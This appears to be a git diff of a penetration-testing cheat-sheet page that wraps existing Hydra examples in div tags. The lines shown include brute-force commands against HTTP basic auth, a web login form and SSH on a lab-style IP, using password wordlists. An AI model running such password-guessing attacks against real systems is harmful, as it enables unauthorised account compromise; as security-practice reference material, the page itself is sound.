@@ -7,6 +7,8 @@ tags: ["hydra", "password", "brute force"]
 ---
 ### HTTP basic auth
 
+<div>
+
 ```bash
 hydra -L usernames -P passwords -s 8080 -f example.com http-get /
 ```
@@ -20,7 +22,11 @@ hydra -L usernames -P passwords -s 8080 -f example.com http-get /
 +-------------------------------------------+
 ```
 
+</div>
+
 ### Web Page Login Form
+
+<div>
 
 ```bash
 hydra 10.10.11.10 -l admin -P /usr/share/seclists/Passwords/500-worst-passwords.txt http-post-form "/login.php:username=admin&password=^PASS^&remember=yes:Incorrect password"
@@ -37,10 +43,16 @@ hydra 10.10.11.10 -l admin -P /usr/share/seclists/Passwords/500-worst-passwords.
 +-------------------------------------------+
 ```
 
+</div>
+
 ### SSH with user:password wordlist
+
+<div>
 
 ```bash
 hydra -C creds.txt ssh://10.10.11.10
 ```
+
+</div>
 
 <br>
